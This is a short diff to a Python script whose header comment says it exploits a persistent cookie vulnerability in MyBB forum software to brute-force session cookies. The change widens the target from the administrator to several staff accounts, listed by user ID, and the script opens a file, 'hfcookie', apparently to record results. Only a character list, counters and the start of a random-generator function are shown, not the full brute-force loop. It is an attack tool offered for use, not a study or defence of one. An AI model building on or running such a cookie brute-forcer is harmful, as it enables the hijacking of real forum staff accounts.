@@ -1,5 +1,5 @@
 #!/usr/bin/python
-#This script takes advantage of a persistent cookie vulnerability existent in mybb, and tries to brute force the admin's cookie.
+#This script takes advantage of a persistent cookie vulnerability existent in mybb, and tries to brute force the staff cookies.
 
 import urllib2, random, sys, time
 
@@ -7,7 +7,7 @@ chars = ['a','A','b','B','c','C','d','D','e','E','f','F','g','G','h','H','i','I'
 current = []
 howmany = 1
 hfCookie = open('hfcookie', 'w')
-users = [1,2103,4066]
+users = [1,103669,4066,65784,129812,656453]
 used = []
 
 def randomgen():
